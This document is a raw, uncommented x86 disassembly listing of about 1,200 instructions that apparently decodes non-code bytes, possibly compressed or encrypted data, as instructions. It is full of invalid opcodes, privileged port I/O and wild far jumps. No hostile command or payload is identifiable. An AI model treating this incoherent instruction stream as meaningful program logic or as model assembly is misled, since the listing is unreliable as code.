  416d9c:	(bad)  [edi+edi*1-0x66]
  416da0:	cld    
  416da1:	mov    ecx,DWORD PTR [eax+0x8]
  416da4:	leave  
  416da5:	sahf   
  416da6:	or     DWORD PTR [esi-0x1973ba80],edi
  416dac:	add    DWORD PTR [edx+0x5],esp
  416daf:	push   esi
  416db0:	dec    esp
  416db1:	pusha  
  416db2:	dec    ebp
  416db3:	cmc    
  416db4:	jle    0x416dc8
  416db6:	sub    eax,0x35517e6
  416dbb:	pop    edx
  416dbc:	pop    ds
  416dbd:	mov    cl,0xf8
  416dbf:	pushf  
  416dc0:	add    eax,0x73c85963
  416dc5:	xchg   edx,eax
  416dc6:	outs   dx,BYTE PTR ds:[esi]
  416dc7:	and    ah,BYTE PTR [ecx-0x6a]
  416dca:	das    
  416dcb:	pop    ds
  416dcc:	stos   BYTE PTR es:[edi],al
  416dcd:	xchg   esi,eax
  416dce:	fsub   DWORD PTR ds:0xda83b374
  416dd4:	jb     0x416e05
  416dd6:	scas   al,BYTE PTR es:[edi]
  416dd7:	mov    ebx,0x78f58193
  416ddc:	adc    al,0x24
  416dde:	fistp  DWORD PTR [edx-0x553ae0e4]
  416de4:	xchg   BYTE PTR [esi+0x7c],al
  416de7:	lods   eax,DWORD PTR ds:[esi]
  416de8:	pop    esp
  416de9:	dec    edx
  416dea:	push   esp
  416deb:	jmp    0x416e2e
  416ded:	add    al,0x12
  416def:	popa   
  416df0:	adc    eax,0x6b4cbc9e
  416df5:	out    0x42,al
  416df7:	test   eax,0x1af41086
  416dfc:	and    esp,DWORD PTR [ecx]
  416dfe:	push   esi
  416dff:	jp     0x416dfa
  416e01:	retf   
  416e02:	mov    ds:0xa4f0dd49,eax
  416e07:	cli    
  416e08:	icebp  
  416e09:	xor    eax,0x11cc978c
  416e0e:	push   0x68d74788
  416e13:	fcmovu st,st(1)
  416e15:	dec    ebx
  416e16:	repz fimul WORD PTR ds:0x65c600cb
  416e1d:	les    esp,FWORD PTR [edx+ebp*2+0x25]
  416e21:	outs   dx,DWORD PTR ds:[esi]
  416e22:	test   DWORD PTR [esi+edi*4+0x4e25a763],edx
  416e29:	div    ebp
  416e2b:	das    
  416e2c:	xor    esi,DWORD PTR [eax-0x5faca29a]
  416e32:	mov    ah,0x2b
  416e34:	scas   eax,DWORD PTR es:[edi]
  416e35:	lods   eax,DWORD PTR ds:[esi]
  416e36:	or     DWORD PTR ds:0x41a383ee,ebx
  416e3c:	push   esp
  416e3d:	aaa    
  416e3e:	cld    
  416e3f:	inc    eax
  416e40:	call   0x42be:0xec1e1cdf
  416e47:	repz mov edx,0x4632ad4e
  416e4d:	or     ch,BYTE PTR [edi+0x6e]
  416e50:	retf   
  416e51:	push   edx
  416e52:	icebp  
  416e53:	or     bl,dh
  416e55:	push   0x92e5feb2
  416e5a:	enter  0x7c3e,0x1f
  416e5e:	mov    bh,0xb1
  416e60:	daa    
  416e61:	es push ds
  416e63:	cmc    
  416e64:	jge    0x416e8f
  416e66:	add    dl,BYTE PTR [edi+0x17]
  416e69:	dec    esp
  416e6a:	into   
  416e6b:	xor    edi,DWORD PTR [ecx]
  416e6d:	pop    esp
  416e6e:	sub    DWORD PTR [ecx+0x231861cb],ebp
  416e74:	popa   
  416e75:	ds test eax,0x3a06829
  416e7b:	je     0x416e19
  416e7d:	mov    DWORD PTR [ecx+edi*1-0x5d],eax
  416e81:	ss mov ch,0x9c
  416e84:	popa   
  416e85:	clc    
  416e86:	mov    ah,0x43
  416e88:	inc    edi
  416e89:	ficom  WORD PTR [esi-0x5f]
  416e8c:	mov    esp,0x90c4907
  416e91:	jno    0x416e8b
  416e93:	mov    ecx,0x668cf8bd
  416e98:	jmp    0x416eb2
  416e9a:	inc    edi
  416e9b:	pop    esi
  416e9c:	mov    bl,0xf7
  416e9e:	ror    BYTE PTR [edx-0x42b095e5],0x76
  416ea5:	push   0xffffff8b
  416ea7:	sti    
  416ea8:	mov    al,ds:0x1e6ea20a
  416ead:	mov    edi,0x3508557f
  416eb2:	dec    esi
  416eb3:	inc    edx
  416eb4:	test   eax,0x591a020e
  416eb9:	mov    edx,0x319a4b57
  416ebe:	adc    eax,0x2a1acdde
  416ec3:	mov    al,ds:0x985b890f
  416ec8:	int3   
  416ec9:	cmp    DWORD PTR [edi+0x7e],ecx
  416ecc:	and    DWORD PTR ds:0x7bf5eaf0,ecx
  416ed2:	lock loope 0x416eac
  416ed5:	int    0x57
  416ed7:	bound  esi,QWORD PTR [ebx]
  416ed9:	in     al,dx
  416eda:	lods   eax,DWORD PTR ds:[esi]
  416edb:	inc    esp
  416edc:	xor    DWORD PTR [edx+0x7a1ab3a9],0x4a5dcd06
  416ee6:	mov    gs,WORD PTR [eax-0x2127c33a]
  416eec:	dec    esp
  416eed:	lea    ebp,[edi-0x2b]
  416ef0:	pushf  
  416ef1:	push   ebp
  416ef2:	js     0x416ee8
  416ef4:	xor    eax,0xc6969b3e
  416ef9:	cmp    al,0xf3
  416efb:	je     0x416f47
  416efd:	xchg   edx,eax
  416efe:	popf   
  416eff:	fidivr DWORD PTR [ebp+0x43b73b4c]
  416f05:	push   ds
  416f06:	mov    edx,0x24f12039
  416f0b:	and    BYTE PTR [esi+0x6b9600b0],cl
  416f11:	xchg   esi,eax
  416f12:	dec    esi
  416f13:	xchg   BYTE PTR [edx-0x1dfce85b],dh
  416f19:	add    ah,ah
  416f1b:	pop    eax
  416f1c:	inc    eax
  416f1d:	cli    
  416f1e:	mov    ch,0x2f
  416f20:	nop
  416f21:	mov    ds:0xf72572ad,al
  416f26:	jns    0x416fa1
  416f28:	(bad)  
  416f2a:	pop    ds
  416f2b:	rcl    DWORD PTR ds:0x89b5741f,1
  416f32:	pop    ds
  416f33:	mov    bh,ch
  416f35:	test   al,0x99
  416f37:	das    
  416f38:	es ret 0x7ee6
  416f3c:	mov    cl,0x74
  416f3e:	pop    edi
  416f3f:	pop    ecx
  416f40:	dec    eax
  416f41:	fsub   DWORD PTR [ebx+eax*8-0x24]
  416f45:	fisttp WORD PTR [esi+0x2a]
  416f48:	cmp    edx,DWORD PTR [ebx-0x61]
  416f4b:	xchg   ecx,eax
  416f4c:	or     BYTE PTR [edx-0x7b88b650],0x4e
  416f53:	stos   DWORD PTR es:[edi],eax
  416f54:	jle    0x416f54
  416f56:	xchg   edi,eax
  416f57:	and    dl,BYTE PTR [edi-0x17]
  416f5a:	fwait
  416f5b:	cmp    bl,dl
  416f5d:	inc    edx
  416f5e:	arpl   cx,ax
  416f60:	and    dh,cl
  416f62:	mov    dh,0xe8
  416f64:	sub    bh,al
  416f66:	and    ch,BYTE PTR [ebp-0x2d]
  416f69:	aaa    
  416f6a:	fst    QWORD PTR [esi+esi*1-0x5]
  416f6e:	cmp    al,0xa0
  416f70:	or     al,0xa
  416f72:	call   0xdecf56c1
  416f77:	mov    BYTE PTR [edi+0x39],al
  416f7a:	mov    esi,0x5179ada9
  416f7f:	int3   
  416f80:	nop
  416f81:	iret   
  416f82:	mov    dl,0xfb
  416f84:	ja     0x416ff4
  416f86:	jp     0x416f3d
  416f88:	fidiv  WORD PTR [ecx+0x3a]
  416f8b:	mov    es:0xc8d6e480,al
  416f91:	xor    bh,BYTE PTR [eax-0x560cb552]
  416f97:	inc    eax
  416f98:	stos   BYTE PTR es:[edi],al
  416f99:	daa    
  416f9a:	cmp    BYTE PTR cs:[ebp-0xc3cb7c8],dh
  416fa1:	sti    
  416fa2:	in     eax,0x1f
  416fa4:	adc    bh,BYTE PTR [ebp+edx*4-0x33]
  416fa8:	aad    0x82
  416faa:	jo     0x416fa5
  416fac:	test   ecx,eax
  416fae:	mov    al,0x13
  416fb0:	and    eax,0xffffffee
  416fb3:	cmp    DWORD PTR [ebp+0x578b41fd],0xfffffffd
  416fba:	imul   BYTE PTR [edx+0x42]
  416fbd:	cmp    BYTE PTR [eax],ch
  416fbf:	mov    cl,0x14
  416fc1:	cmp    edx,DWORD PTR [edx+0x11]
  416fc4:	sub    DWORD PTR [ecx+0x1f5518b9],edi
  416fca:	xchg   ecx,eax
  416fcb:	cmc    
  416fcc:	arpl   WORD PTR [ebp+0x6c0da5ca],ax
  416fd2:	xchg   edi,eax
  416fd3:	dec    esp
  416fd4:	push   eax
  416fd5:	push   cs
  416fd6:	sub    edx,DWORD PTR [esi]
  416fd8:	mov    ebp,0xbd50d02f
  416fdd:	cli    
  416fde:	jne    0x416f84
  416fe0:	rcl    edi,1
  416fe2:	ins    BYTE PTR es:[edi],dx
  416fe3:	pusha  
  416fe4:	aad    0x6
  416fe6:	jle    0x48e9fc62
  416fec:	sub    BYTE PTR [edx+edi*4+0x34],0xba
  416ff1:	adc    esi,eax
  416ff3:	adc    bl,cl
  416ff5:	fisub  WORD PTR [ebx]
  416ff7:	std    
  416ff8:	mov    esi,0x62d4e7d6
  416ffd:	mov    esi,0x2435806e
  417002:	retf   
  417003:	mov    al,ds:0xcbf90df4
  417008:	sub    edx,DWORD PTR [eax+0x33]
  41700b:	pop    ecx
  41700c:	push   0x9c461817
  417011:	sub    al,0x99
  417013:	aad    0x6d
  417015:	(bad)  
  417016:	mov    ds:0xee2652d0,eax
  41701b:	mov    ah,0xb0
  41701d:	or     ebp,DWORD PTR [edi+0x54]
  417020:	in     eax,0x7d
  417022:	(bad)  
  417023:	adc    al,0x79
  417025:	inc    edx
  417026:	nop
  417027:	(bad)  
  417028:	sti    
  417029:	in     eax,0x6c
  41702b:	mul    DWORD PTR [eax+0x71cb565e]
  417031:	das    
  417032:	mov    dl,ah
  417034:	inc    ebx
  417035:	outs   dx,BYTE PTR ds:[esi]
  417036:	imul   esp,esp,0x8ad37483
  41703c:	in     al,0xe0
  41703e:	or     DWORD PTR [edi],0x11
  417041:	rcr    ecx,1
  417043:	xor    eax,0x89c468a
  417048:	lods   eax,DWORD PTR ds:[esi]
  417049:	mov    ch,0xf2
  41704b:	aaa    
  41704c:	adc    BYTE PTR es:[eax-0x29],dh
  417050:	jmp    0x417095
  417052:	add    BYTE PTR [eax+0x14d1170c],0x5e
  417059:	push   ss
  41705a:	fild   QWORD PTR [ecx+0x64]
  41705d:	inc    edx
  41705e:	fucomip st,st(0)
  417060:	push   eax
  417061:	out    0xc1,eax
  417063:	push   eax
  417064:	push   edi
  417065:	stos   DWORD PTR es:[edi],eax
  417066:	sbb    cl,BYTE PTR [edx-0xf]
  417069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41706a:	dec    eax
  41706b:	lods   al,BYTE PTR ds:[esi]
  41706c:	dec    ecx
  41706d:	adc    DWORD PTR [eax],0x48
  417070:	jge    0x41707c
  417072:	xor    DWORD PTR [eax+0x562018be],esi
  417078:	or     ah,BYTE PTR [eax-0x12]
  41707b:	jl     0x417018
  41707d:	les    edi,FWORD PTR [ebx-0x79]
  417080:	xor    al,0xa
  417082:	jecxz  0x417083
  417084:	push   es
  417085:	adc    al,0x25
  417087:	push   edx
  417088:	or     al,0x76
  41708a:	(bad)  
  41708b:	jle    0x417014
  41708d:	sub    dl,BYTE PTR ds:0xfcb8f57e
  417093:	ss push esp
  417095:	xor    eax,0x29baef96
  41709a:	xlat   BYTE PTR ds:[ebx]
  41709b:	jg     0x4170a4
  41709d:	mov    BYTE PTR [ecx*2-0xd1f547f],bl
  4170a4:	sbb    esi,DWORD PTR [ebp+0x49b89e3a]
  4170aa:	jl     0x41705c
  4170ac:	mov    edi,0x37afbc40
  4170b1:	mov    eax,0x84a74fb4
  4170b6:	cli    
  4170b7:	or     al,0xb6
  4170b9:	fucomi st,st(2)
  4170bb:	add    BYTE PTR [eax+0x8e5a7b6],dl
  4170c1:	in     eax,0xc6
  4170c3:	and    BYTE PTR [esp+ecx*2-0x61ed43b],dh
  4170ca:	push   esp
  4170cb:	call   0xeef1:0xe03122d9
  4170d2:	mov    al,0xbd
  4170d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170d5:	sub    eax,0xcb83573f
  4170da:	add    eax,0xfa662149
  4170df:	cwde   
  4170e0:	fnstcw WORD PTR [eax-0x3e24d769]
  4170e6:	(bad)  
  4170e7:	jmp    0x910108ec
  4170ec:	sub    eax,0x904e7d53
  4170f1:	pop    edi
  4170f2:	pusha  
  4170f3:	or     esi,esp
  4170f5:	mov    eax,0xbb3c4562
  4170fa:	sbb    DWORD PTR [esi],ebp
  4170fc:	pop    eax
  4170fd:	push   eax
  4170fe:	in     al,dx
  4170ff:	in     eax,dx
  417100:	mov    cl,0x60
  417102:	cld    
  417103:	pushf  
  417104:	sbb    esp,DWORD PTR [ecx+0x4d882c82]
  41710a:	out    dx,al
  41710b:	add    BYTE PTR [ebp+eiz*2-0x1e],0x86
  417110:	sub    edi,DWORD PTR [edi]
  417112:	pop    ecx
  417113:	mov    WORD PTR [eax],?
  417115:	xor    bl,0x12
  417118:	outs   dx,BYTE PTR ds:[esi]
  417119:	std    
  41711a:	pop    esp
  41711b:	jle    0x4170bf
  41711d:	push   0xa7bf3398
  417122:	loopne 0x417197
  417124:	xchg   edi,eax
  417125:	(bad)  
  417126:	cmp    dh,BYTE PTR [ebx]
  417128:	and    esi,ecx
  41712a:	outs   dx,BYTE PTR ds:[esi]
  41712b:	pop    ebx
  41712c:	mov    esi,0x54b0ed35
  417131:	nop
  417132:	lods   al,BYTE PTR ds:[esi]
  417133:	jb     0x417154
  417135:	test   al,0x30
  417137:	aaa    
  417138:	ins    DWORD PTR es:[edi],dx
  417139:	sbb    BYTE PTR [ecx-0x2d],bl
  41713c:	xchg   ebx,eax
  41713d:	sub    BYTE PTR [edx+ebp*1+0x3],al
  417141:	cmp    dh,bh
  417143:	adc    DWORD PTR [eax+0x3b],0xfffffffe
  417147:	cwde   
  417148:	cmp    ah,BYTE PTR [ebx]
  41714a:	and    edx,esp
  41714c:	inc    BYTE PTR [esi+0x67f01737]
  417152:	ror    edi,0x36
  417155:	fdiv   DWORD PTR [ecx+0x28]
  417158:	stos   BYTE PTR es:[edi],al
  417159:	pop    eax
  41715a:	jne    0x4171a4
  41715c:	adc    eax,0x9c08cdd0
  417161:	btr    DWORD PTR [edi],ecx
  417164:	nop
  417165:	imul   esi,ebp,0x4cd16c7e
  41716b:	sub    edi,DWORD PTR [ebp-0x642be7d6]
  417171:	push   0x3d263ef7
  417176:	cmp    bl,BYTE PTR [ebx]
  417178:	lods   eax,DWORD PTR ds:[esi]
  417179:	mov    cl,0x1c
  41717b:	xchg   edx,eax
  41717c:	bnd call 0x632a56cc
  417182:	sbb    dh,BYTE PTR [edx+ebp*2+0x3d]
  417186:	enter  0x21e9,0x9e
  41718a:	ins    BYTE PTR es:[edi],dx
  41718b:	loop   0x4171d4
  41718d:	lahf   
  41718e:	iret   
  41718f:	inc    esi
  417190:	xchg   ebx,eax
  417191:	call   0x5c0:0x63400c0a
  417198:	aam    0x90
  41719a:	and    bl,BYTE PTR [ecx-0x55]
  41719d:	mov    ecx,0xd300d0a0
  4171a2:	call   0x67596418
  4171a7:	fld    DWORD PTR [ecx-0x473b4d7d]
  4171ad:	adc    esi,DWORD PTR [esi]
  4171af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171b0:	inc    edi
  4171b1:	test   BYTE PTR [eax-0x7d],dh
  4171b4:	dec    edi
  4171b5:	pusha  
  4171b6:	sbb    al,0x21
  4171b8:	pop    edx
  4171b9:	les    esi,FWORD PTR [edx]
  4171bb:	xor    BYTE PTR [eax],bh
  4171bd:	outs   dx,DWORD PTR ds:[esi]
  4171be:	pop    es
  4171bf:	and    bl,bh
  4171c1:	pop    esp
  4171c2:	adc    DWORD PTR [esi],ebx
  4171c4:	pop    ecx
  4171c5:	stc    
  4171c6:	test   eax,0x14a515c1
  4171cb:	stc    
  4171cc:	and    al,0xde
  4171ce:	and    DWORD PTR [edx],ecx
  4171d0:	aas    
  4171d1:	cmp    cl,BYTE PTR [ecx-0x78]
  4171d4:	jo     0x4171d9
  4171d6:	dec    ebp
  4171d7:	mov    ss,WORD PTR [ecx-0x76]
  4171da:	cmp    eax,0x22fe767b
  4171df:	mov    edi,0x9e50c3af
  4171e4:	fcomp  QWORD PTR [ebx-0x55]
  4171e7:	jmp    0x417256
  4171e9:	adc    DWORD PTR [ebx],0xffffffae
  4171ec:	and    edi,ebp
  4171ee:	clc    
  4171ef:	pushf  
  4171f0:	mov    dl,0xb
  4171f2:	out    0x91,eax
  4171f4:	mov    ah,0x13
  4171f6:	mov    eax,0x3c7250e6
  4171fb:	or     al,0xe7
  4171fd:	push   0x72667549
  417202:	loope  0x4171f2
  417204:	add    esi,ebx
  417206:	xchg   ebp,eax
  417207:	sbb    bh,al
  417209:	inc    DWORD PTR [esi]
  41720b:	bound  ecx,QWORD PTR [esi-0x20]
  41720e:	call   0xd3221d1c
  417213:	dec    edi
  417214:	fidivr DWORD PTR [ebp-0x60]
  417217:	pop    esp
  417218:	xchg   ebp,eax
  417219:	sub    BYTE PTR [edx-0x39],dh
  41721c:	sub    ax,0xa936
  417220:	ret    0x7328
  417223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417224:	cmp    ebp,DWORD PTR [edx+0x4]
  417227:	push   ebx
  417228:	aad    0x1
  41722a:	mov    dh,0xd8
  41722c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41722d:	test   BYTE PTR [ebx],dh
  41722f:	pusha  
  417230:	mov    es,WORD PTR [eax+0xc]
  417233:	mov    ds:0xe522016a,eax
  417238:	or     DWORD PTR [eax-0x4ce122a1],ebx
  41723e:	ror    ah,0x9b
  417241:	xor    bl,BYTE PTR [ebx+0x5c]
  417244:	cli    
  417245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417246:	test   al,0x1b
  417248:	dec    ebx
  417249:	mov    BYTE PTR ds:0x323032be,ah
  41724f:	loope  0x41728e
  417251:	(bad)  
  417252:	fdiv   st,st(7)
  417254:	pusha  
  417255:	lea    ecx,[ecx+0x6729951a]
  41725b:	aad    0x6
  41725d:	ficom  DWORD PTR [ebp+0x7]
  417260:	cmp    eax,0x73544998
  417265:	jns    0x417209
  417267:	(bad)  
  417269:	jne    0x4172af
  41726b:	test   DWORD PTR ds:0x10eac5d9,edi
  417271:	push   esi
  417272:	hlt    
  417273:	and    al,bh
  417275:	and    DWORD PTR [edi+0x4c6ba29e],0x901d06b4
  41727f:	retf   
  417280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417281:	ss mov dh,0xec
  417284:	jp     0x4172cf
  417286:	xlat   BYTE PTR ds:[ebx]
  417287:	fisttp DWORD PTR [ecx+eiz*2]
  41728a:	jecxz  0x417285
  41728c:	mov    eax,0xdbb2cd35
  417291:	pop    ds
  417292:	imul   eax,esp,0x446c1634
  417298:	xchg   BYTE PTR [ebp-0x544147f3],dh
  41729e:	fincstp 
  4172a0:	stos   BYTE PTR es:[edi],al
  4172a1:	je     0x417241
  4172a3:	mov    bh,0x72
  4172a5:	inc    ebx
  4172a6:	add    eax,0x52900d53
  4172ab:	shl    DWORD PTR [ebp-0x52],0xb3
  4172af:	jbe    0x417258
  4172b1:	mov    eax,esp
  4172b3:	fisttp DWORD PTR [edx]
  4172b5:	cs sahf 
  4172b7:	sub    BYTE PTR [ecx-0x48e2f223],dh
  4172bd:	sub    eax,0xf21a1d32
  4172c2:	push   0x89246f9
  4172c7:	hlt    
  4172c8:	inc    ebx
  4172c9:	xchg   ebp,eax
  4172ca:	rcr    cl,0x97
  4172cd:	xor    al,0x4c
  4172cf:	clc    
  4172d0:	shrd   DWORD PTR [ebx-0x1],ebp,cl
  4172d4:	and    DWORD PTR [ebp+0x1f],esp
  4172d7:	scas   al,BYTE PTR es:[edi]
  4172d8:	mov    eax,0x78172c6c
  4172dd:	mov    WORD PTR [edi-0x7e1ff54],?
  4172e3:	daa    
  4172e4:	inc    ecx
  4172e5:	inc    ebx
  4172e6:	cmp    DWORD PTR [ebx],esi
  4172e8:	neg    bh
  4172ea:	push   eax
  4172eb:	gs mov ah,0xa5
  4172ee:	les    eax,FWORD PTR [edx-0x49]
  4172f1:	ja     0x417318
  4172f3:	cmp    dh,BYTE PTR [ebp-0x23]
  4172f6:	cmp    al,0x55
  4172f8:	pushf  
  4172f9:	neg    DWORD PTR [ecx+esi*8+0x31]
  4172fd:	adc    al,0x4e
  4172ff:	repz pop edx
  417301:	pop    ebp
  417302:	js     0x417333
  417304:	out    0x79,al
  417306:	mov    BYTE PTR [edx],bh
  417308:	jmp    0xdb15:0x85245940
  41730f:	add    esi,DWORD PTR [edi]
  417311:	popf   
  417312:	xor    edi,DWORD PTR [ecx+0x5f]
  417315:	jns    0x4172db
  417317:	sub    BYTE PTR [ebp+0x1158c916],dl
  41731d:	out    dx,eax
  41731e:	fwait
  41731f:	lods   al,BYTE PTR ds:[esi]
  417320:	adc    BYTE PTR [edi+0x39bda998],dh
  417326:	clc    
  417327:	cmp    eax,0xb613a84
  41732c:	pushf  
  41732d:	sub    al,ah
  41732f:	mov    gs,WORD PTR [ebp+0x4]
  417332:	fisttp QWORD PTR [ecx+0x18a4de9a]
  417338:	push   ebp
  417339:	fnstsw WORD PTR [esi+0x4adac188]
  41733f:	out    0x74,al
  417341:	jl     0x41735a
  417343:	into   
  417344:	push   cs
  417345:	xor    BYTE PTR [eax],bh
  417347:	mov    ebp,0xd5a702
  41734c:	nop
  41734d:	dec    esp
  41734e:	scas   eax,DWORD PTR es:[edi]
  41734f:	push   eax
  417350:	scas   eax,DWORD PTR es:[edi]
  417351:	popa   
  417352:	xor    al,0xfa
  417354:	(bad)  
  417355:	int    0xce
  417357:	jne    0x4172e2
  417359:	fldcw  WORD PTR [eax+0x19]
  41735c:	push   ebx
  41735d:	add    esp,DWORD PTR [ecx-0x59]
  417360:	mov    WORD PTR [esi+ebx*8+0x59ec0f34],gs
  417367:	outs   dx,DWORD PTR ds:[esi]
  417368:	sub    cl,BYTE PTR [edi]
  41736a:	aam    0x7f
  41736c:	xchg   eax,eax
  41736e:	pop    ebx
  41736f:	arpl   WORD PTR [ebp+0x1ef58011],dx
  417375:	iret   
  417376:	dec    ecx
  417377:	pop    edi
  417378:	iret   
  417379:	in     eax,dx
  41737a:	adc    BYTE PTR [ebx-0x3f],dh
  41737d:	sub    cl,0x30
  417380:	ret    
  417381:	ins    BYTE PTR es:[edi],dx
  417382:	(bad)  
  417383:	je     0x4173aa
  417385:	ins    BYTE PTR es:[edi],dx
  417386:	add    eax,0x4aead8f
  41738b:	add    DWORD PTR [ebp-0x14],ecx
  41738e:	nop
  41738f:	lods   eax,DWORD PTR ds:[esi]
  417390:	jb     0x417395
  417392:	or     bl,al
  417394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417395:	and    DWORD PTR [edx-0x7ff0bea],esi
  41739b:	leave  
  41739c:	lock cld 
  41739e:	mov    BYTE PTR [ebx+0x3ebe0642],cl
  4173a4:	push   ecx
  4173a5:	mov    ebx,0x8606d2a1
  4173aa:	test   DWORD PTR [edi+0x3],ecx
  4173ad:	add    eax,0x25254d4d
  4173b2:	jnp    0x417413
  4173b4:	in     al,dx
  4173b5:	pushf  
  4173b6:	xchg   esp,eax
  4173b7:	pop    ebp
  4173b8:	or     eax,0x2d2a9dff
  4173bd:	(bad)  
  4173be:	inc    ebx
  4173bf:	xchg   esp,eax
  4173c0:	jb     0x417403
  4173c2:	iret   
  4173c3:	adc    bl,al
  4173c5:	ins    BYTE PTR es:[edi],dx
  4173c6:	and    al,0x61
  4173c8:	jmp    0x4173b6
  4173ca:	shl    BYTE PTR [eax],1
  4173cc:	jmp    0x417423
  4173ce:	cmp    eax,0x3b1f762b
  4173d3:	xor    al,cl
  4173d5:	or     eax,0x995664a7
  4173da:	enter  0xab6a,0x28
  4173de:	leave  
  4173df:	stos   DWORD PTR es:[edi],eax
  4173e0:	or     al,0x34
  4173e2:	out    dx,eax
  4173e3:	test   ebx,edx
  4173e5:	(bad)  
  4173e6:	stos   BYTE PTR es:[edi],al
  4173e7:	out    0x74,eax
  4173e9:	cmp    DWORD PTR [esi+0xf],ecx
  4173ec:	dec    esi
  4173ed:	popa   
  4173ee:	cwde   
  4173ef:	push   cs
  4173f0:	mov    ebp,0x53c93eab
  4173f5:	sbb    edi,DWORD PTR [esi]
  4173f7:	retf   0x8fb5
  4173fa:	pop    eax
  4173fb:	(bad)  
  4173fc:	popf   
  4173fd:	cwde   
  4173fe:	and    DWORD PTR [ecx-0x22],esi
  417401:	sahf   
  417402:	xchg   edi,eax
  417403:	test   DWORD PTR [esi],0x73393415
  417409:	xchg   ecx,eax
  41740a:	jmp    0xc53f:0x8f12ac5b
  417411:	test   eax,0x534d1c08
  417416:	mov    fs,WORD PTR [ebp+0x4458788f]
  41741c:	xchg   ecx,eax
  41741d:	adc    BYTE PTR [edi+0x6a],0x47
  417421:	and    DWORD PTR ds:0x6aed21d,edx
  417427:	ret    0x65d4
  41742a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41742b:	add    BYTE PTR [eax],dl
  41742d:	push   cs
  41742e:	hlt    
  41742f:	or     DWORD PTR [ebp-0x63],ebp
  417432:	push   0xad714f6f
  417437:	sbb    al,0x45
  417439:	fmulp  st(4),st
  41743b:	push   0xffffff88
  41743d:	dec    DWORD PTR [edx+0x3dee93e5]
  417443:	pop    esp
  417444:	or     BYTE PTR [eax+ebp*2],bh
  417447:	sahf   
  417448:	sbb    BYTE PTR [eax+0x6096876a],al
  41744e:	imul   edx,DWORD PTR [ecx-0x9],0xffffffc2
  417452:	cs (bad) 
  417455:	xor    ch,BYTE PTR [ecx+0x3e]
  417458:	add    BYTE PTR [eax-0x1947beeb],al
  41745e:	loopne 0x417463
  417460:	(bad)  
  417461:	xchg   edx,eax
  417462:	popf   
  417463:	xor    bh,ah
  417465:	xor    esp,DWORD PTR [edx+0x688e4ed5]
  41746b:	xchg   al,bh
  41746d:	rol    cl,0xd0
  417470:	dec    edi
  417471:	xor    al,0xaf
  417473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417474:	hlt    
  417475:	cdq    
  417476:	lds    ebp,FWORD PTR [ebx]
  417478:	lea    esi,[edi-0x26]
  41747b:	dec    ecx
  41747c:	scas   al,BYTE PTR es:[edi]
  41747d:	xchg   ebp,eax
  41747e:	cmp    bh,BYTE PTR [edi]
  417480:	dec    esi
  417481:	iret   
  417482:	sub    BYTE PTR [eax+0x61],bh
  417485:	call   0x1961:0xe00b7d80
  41748c:	js     0x41743e
  41748e:	test   eax,0x6457a1b8
  417493:	xor    esp,DWORD PTR [eax]
  417495:	pop    ebx
  417496:	fisub  DWORD PTR [ebx]
  417498:	mov    ebp,DWORD PTR [eax-0x62f59ed1]
  41749e:	enter  0x4f1d,0xc4
  4174a2:	out    0x2a,al
  4174a4:	add    eax,0x32b8b912
  4174a9:	idiv   DWORD PTR [ebp-0x74]
  4174ac:	xchg   ecx,eax
  4174ad:	dec    edx
  4174ae:	add    ebx,DWORD PTR [ecx+ebp*8-0x6a]
  4174b2:	lods   eax,DWORD PTR ds:[esi]
  4174b3:	mov    ch,0x2f
  4174b5:	adc    BYTE PTR [esi-0x7b],dl
  4174b8:	jne    0x417533
  4174ba:	xchg   edx,eax
  4174bb:	sti    
  4174bc:	lahf   
  4174bd:	ss jecxz 0x417505
  4174c0:	and    DWORD PTR [ecx+0x4],0xffffffdb
  4174c4:	stc    
  4174c5:	xchg   ch,bl
  4174c7:	xor    al,BYTE PTR [esi]
  4174c9:	push   ecx
  4174ca:	mov    esp,0xd195a352
  4174cf:	arpl   WORD PTR [edx-0x71],sp
  4174d2:	sbb    BYTE PTR [esi],0x23
  4174d5:	out    dx,eax
  4174d6:	ds ss adc eax,0x8d96aff7
  4174dd:	cli    
  4174de:	and    eax,0x9e5a8654
  4174e3:	sbb    esp,DWORD PTR [edi+ebx*4]
  4174e6:	push   edx
  4174e7:	xchg   ebx,eax
  4174e8:	xchg   edx,eax
  4174e9:	js     0x417532
  4174eb:	cld    
  4174ec:	inc    esp
  4174ed:	pusha  
  4174ee:	shr    DWORD PTR [ebx-0x6e54ec5],0x45
  4174f5:	or     dh,BYTE PTR [ebp+edi*4+0x1a]
  4174f9:	sbb    ebp,DWORD PTR [ebx]
  4174fb:	xlat   BYTE PTR ds:[ebx]
  4174fc:	sbb    bh,BYTE PTR [ebp-0x2d3ca2d0]
  417502:	test   BYTE PTR [esi-0x65e4d46b],bh
  417508:	dec    eax
  417509:	dec    ebx
  41750a:	dec    edi
  41750b:	lds    edi,FWORD PTR [edx+edx*2]
  41750e:	int    0x69
  417510:	rol    DWORD PTR ds:0xc9e19b5f,1
  417516:	stos   DWORD PTR es:[edi],eax
  417517:	sbb    al,cl
  417519:	dec    eax
  41751a:	xchg   BYTE PTR [ebp-0x3e],dh
  41751d:	cmp    eax,0xe883ffca
  417522:	add    al,0xf6
  417524:	push   cs
  417525:	(bad)  
  417526:	mov    al,0x4f
  417528:	mov    ch,0xaa
  41752a:	(bad)  
  41752b:	mov    ebx,0x65e7fa62
  417530:	(bad)  [edi+0x5ccfca16]
  417536:	in     al,dx
  417537:	dec    ecx
  417538:	mov    esp,0x13609259
  41753d:	es mov fs,esi
  417540:	mov    edx,DWORD PTR [ecx+0x7c5a0e5e]
  417546:	jmp    0x46eedad4
  41754b:	add    eax,0x9276d188
  417550:	or     al,0xef
  417552:	lods   al,BYTE PTR ds:[esi]
  417553:	mov    dh,0x69
  417555:	jg     0x417540
  417557:	inc    ebx
  417558:	xchg   ebp,eax
  417559:	(bad)  
  41755a:	xor    al,BYTE PTR [esi]
  41755c:	and    DWORD PTR [ebp-0x4bd56b92],edx
  417562:	sub    eax,0x66a51a91
  417567:	pop    esp
  417568:	rol    BYTE PTR [esi+0x2b85cfa],1
